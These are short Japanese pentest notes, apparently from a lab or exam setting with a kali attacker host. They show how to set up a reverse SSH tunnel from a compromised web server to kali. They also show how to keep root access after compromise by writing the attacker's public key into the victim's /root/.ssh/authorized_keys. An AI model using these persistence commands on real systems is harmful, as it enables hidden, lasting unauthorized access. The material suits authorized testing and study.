### 被害者端末からkaliにssh接続する場合

* 被害者端末で鍵を作成する

```bash
mkdir keys
cd keys
ssh-keygen
cat id_rsa.pub

# 注意：パーミッションがある場所に鍵を作成するようにディレクトリを指定してあげる
----
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/keys/id_rsa #ここポイント
```

* 公開鍵をkaliのauthorize_keysに設定する

```bash
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+ZSOi7+cWKIqI4Lh+9eCy7/khCpfhvLlZHK8zYUYd2JXv6MP8iW65BiAb4hyMUXQk3BYTzy7iDxNrqFLmJgi6oAqaGjS1WDMZMyxF0iWwb9PhHVyrFHaUEBl1qFiofYk9K6C3zqfBe9Fdf68yLhqMc4zjAT08FrlAGWbZDlRrqK3eK/0znIlhjCyaNOfwBKECng1RU00sSTHFUk6eXdOJenqTKH4yDYw1NKXGTEqqiFw4La6FeV9uU3JZ3LSVe3Hr19xpzIuwmudw2yrCsCNXd3nvWRLxezU+HpZrXlaOIQHgLhAqau2kzeJiv51RgRrFR7iGGYh+v9S6WSvAd22J www-data@ajla
```

* fromでIPアドレスを制限する.対象のwebサーバーのIPアドレスではなくkaliから見えるホスト(proxyサーバーなど)を設定すること



### 被害者端末でroot権限を取得しkaliからssh接続を永続化したい場合

* kaliの公開鍵をコピーする

  ```
  cat ~/.ssh/id_rsa.pub 
  ```

* 被害者端末のroot配下にauthorize_keysを作成する

  ```bash
  mkdir /root/.ssh
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1YWyN2WQA0XH+IVSK2vB5QA5+0CNkrGgRraOcmgr2mM8IG3tWQ1pBvZKgHjvEIXze2rjTZ/dviujuf7evZrDVZ8fI5j4mFnMgDc77wIZdoi8gktxk5M5QAByc8Vhanh5yh/h3RVplffjI6jDy6ytd1PwuxkibVK5MILuI9RpfgUz1VhAPFdCrM4z7uVyOC78pI/QalLBYuPdHLHJHj1O24CHRi+jhWjnu1/+owqERWhFcoINKImMWMLq4PKPdDP9BcobPIdizpkKaL0++h0ulD/NWFygKYENf2/wrzzmQtFxn2qXOykkAAg9zxKKnskMfwQWNPP/ZnRdTo2lgA3Lbf1fNQMwKzqAbDCMi9NmUip51p7byiC4NsnzssZ8zIWZY+8TWyOxiuuD7YjJyI/XG7LaArm8n8ZMFh2q0tMlxhQgdklq0wreeZAvZKGc0C/PcqAoN+Ez63EsxQIzlafhaI/ymjZATXvMgzcrUS8f5ZDOpey9ELZGlr+GlYnSXhe8= kali@kali" > /root/.ssh/authorized_keys
  ```

* sshログインする

  ```bash
  ssh root@sandbox.local
  ```

  